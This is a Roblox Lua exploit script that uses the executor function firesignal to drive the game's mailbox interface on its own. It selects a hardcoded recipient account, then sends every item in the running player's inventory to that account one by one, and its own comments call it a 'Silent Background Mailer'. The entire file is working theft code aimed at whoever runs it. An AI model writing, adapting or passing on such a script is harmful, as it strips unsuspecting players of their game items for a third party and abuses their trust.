-- Configuration
local targetUser = "cayden231s"
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Direct Core Layout Paths
local mailboxUI = playerGui:WaitForChild("MailboxUI")
local frame = mailboxUI:WaitForChild("Frame")
local sendingFrame = frame:WaitForChild("SendingFrame")
local itemSendFrame = sendingFrame:WaitForChild("ItemSendFrame")
local selectPlayerFrame = sendingFrame:WaitForChild("SelectPlayerFrame")
local playerList = selectPlayerFrame:WaitForChild("PlayerList")
local sendButton = itemSendFrame:WaitForChild("SendButton")

local function runTrueBackgroundAutomation()
    print("--- Initializing Silent Background Mailer ---")
    
    -- STEP 1: Targeted Player Selection via Deep-Scan
    local targetButton = nil
    for _, child in ipairs(playerList:GetChildren()) do
        if child:IsA("GuiObject") then
            -- Deep scan every text object inside the player slot asset for the username
            local elements = child:GetDescendants()
            for _, el in ipairs(elements) do
                if el:IsA("TextLabel") and (string.find(el.Text:lower(), targetUser:lower()) or string.find(el.Text:lower(), "rich")) then
                    targetButton = child
                    break
                end
            end
        end
        if targetButton then break end
    end
    
    if not targetButton then
        warn("Could not find a valid player card matching: " .. targetUser)
        return
    end
    
    -- Programmatically trigger the player selection frame flip
    print("Target player slot locked. Firing selection frame...")
    local playerToggle = targetButton:IsA("TextButton") and targetButton or targetButton:FindFirstChildOfClass("TextButton", true)
    if playerToggle then
        firesignal(playerToggle.MouseButton1Click)
        firesignal(playerToggle.Activated)
        task.wait(0.6) -- Wait for the UI layout view to flip over smoothly
    end
    
    -- STEP 2: Strict Inventory Grid Scanning
    local scrollBox = itemSendFrame:FindFirstChild("ScrollingFrames") or itemSendFrame:FindFirstChildOfClass("ScrollingFrame", true) or itemSendFrame:FindFirstChild("ScrollingFrame", true)
    
    if not scrollBox then
        warn("Inventory item box container could not be found.")
        return
    end
    
    print("Scanning item grid cells silently...")
    -- Loop through the absolute items container list
    for _, cell in ipairs(scrollBox:GetChildren()) do
        -- Strictly process grid objects, ignoring structural layouts and padding rules
        if cell:IsA("GuiObject") and cell.Name ~= "UIGridLayout" and cell.Name ~= "UIPadding" and cell.Name ~= "Frame" then
            
            -- Isolate the direct selection button template inside the inventory square cell
            local cellTrigger = cell:IsA("TextButton") and cell or cell:FindFirstChildOfClass("TextButton", true) or cell:FindFirstChildOfClass("ImageButton", true)
            
            if cellTrigger then
                print("Moving item slot to staging area: " .. cell.Name)
                firesignal(cellTrigger.MouseButton1Click)
                firesignal(cellTrigger.Activated)
                task.wait(0.2) -- Micro-delay to let the frame staging register
                
                -- STEP 3: Silent Confirmation Action Firing
                if sendButton then
                    firesignal(sendButton.MouseButton1Click)
                    firesignal(sendButton.Activated)
                    
                    -- Safe cooldown period for the server network handler to process and clear the slot
                    task.wait(1.0)
                else
                    warn("Send confirmation button reference was broken during iteration.")
                    break
                end
            end
        end
    end
    
    print("--- Background Automation Task Finished ---")
end

runTrueBackgroundAutomation()
